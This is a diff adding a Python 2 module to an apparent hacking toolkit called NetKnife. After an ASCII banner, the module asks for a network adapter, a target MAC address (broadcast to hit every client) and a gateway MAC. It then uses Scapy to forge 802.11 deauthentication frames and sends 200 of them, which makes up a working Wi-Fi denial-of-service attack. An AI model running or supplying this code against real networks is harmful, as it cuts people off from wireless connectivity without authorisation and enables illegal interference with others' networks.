+++ NetKnife/modules/deauthenticatio.py
@@ -1,0 +1,24 @@
+from colorama import Fore
+
+def Deauthentication():
+
+
+    print """
+    .########..########....###....##.....##.########.##.....##.########.##....##.########.####..######.....###....########.####..#######..##....##
+    .##.....##.##.........##.##...##.....##....##....##.....##.##.......###...##....##.....##..##....##...##.##......##.....##..##.....##.###...##
+    .##.....##.##........##...##..##.....##....##....##.....##.##.......####..##....##.....##..##........##...##.....##.....##..##.....##.####..##
+    .##.....##.######...##.....##.##.....##....##....#########.######...##.##.##....##.....##..##.......##.....##....##.....##..##.....##.##.##.##
+    .##.....##.##.......#########.##.....##....##....##.....##.##.......##..####....##.....##..##.......#########....##.....##..##.....##.##..####
+    .##.....##.##.......##.....##.##.....##....##....##.....##.##.......##...###....##.....##..##....##.##.....##....##.....##..##.....##.##...###
+    .########..########.##.....##..#######.....##....##.....##.########.##....##....##....####..######..##.....##....##....####..#######..##....##
+    """
+    iface = raw_input("Plese Enter The Network Adapter: ")
+    TargetMac = raw_input("Plese Enter The Target Mac Address(for All Target Enter the Brotcast Mac Addess): ")
+
+    Gateway = raw_input("Plese Enter The Gateway Mac Address: ")
+
+    dot11_packet = Dot11(addr1=TargetMac,addr2=Gateway,addr3=Gateway)
+    Deauth = RadioTap()/dot11_packet/Dot11Deauth(reason=7)
+    print "Started Deauthentication Attack on:" + TargetMac
+    sendp(Deauth, inter=1.0, count=200, iface=iface, verbose=1)
+
